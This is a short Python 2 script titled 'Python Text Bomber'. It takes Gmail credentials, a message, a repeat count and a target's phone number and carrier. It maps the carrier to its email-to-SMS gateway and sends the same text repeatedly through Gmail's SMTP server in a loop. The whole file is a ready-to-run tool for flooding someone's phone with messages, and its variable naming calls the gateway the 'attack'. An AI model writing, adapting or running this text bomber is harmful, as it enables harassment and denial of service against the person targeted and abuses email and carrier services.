#Rishabh Shah
#2016
#Python Text Bomber

#imports
import smtplib
import sys
import getpass
import time
from progressbar import AnimatedMarker, Bar, BouncingBar, Counter, ETA, \
    FileTransferSpeed, FormatLabel, Percentage, \
    ProgressBar, ReverseBar, RotatingMarker, \
    SimpleProgress, Timer

#functions
def blankLine():
	print ""

def wait(x):
	time.sleep(x)
	
# Credentials
username = raw_input("Enter username: ")
password = getpass.getpass("Enter password: ")

#setting variables
fromaddr = str(username) + "@gmail.com"
msg = raw_input("What would you like your message to be?: ")
times = input("How many times to send message?: ")
currenttime = 1
number = input("What is their phone number?: ")
print """Carriers:
	1. AT&T
	2. Sprint
	3. T-Mobile
	4. Verizon	
	5. Cricket
"""
carrier = input("Enter carrier number here: ")

if carrier == 1:
	carrier_attack = "@txt.att.net"
if carrier == 2:
	carrier_attack = "@messaging.sprintpcs.com"
if carrier == 3:
	carrier_attack = "@tmomail.net"
if carrier == 4:
	carrier_attack = "@vtext.com"
if carrier == 5:
	carrier_attack = "@mms.cricketwireless.net"

toaddrs = "1" + str(number) + str(carrier_attack)
print str(toaddrs)

# The actual mail send
pbar = ProgressBar(widgets=[Percentage(), Bar()], maxval = int(times)).start()
for i in range(int(times)):
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	server.login(username,password)
	server.sendmail(fromaddr, toaddrs, msg)
	server.quit()
	pbar.update(i+1)
	currenttime +=1
pbar.finish()
print "Done"
wait(1)
print "Goodbye"
wait (1)
sys.exit()
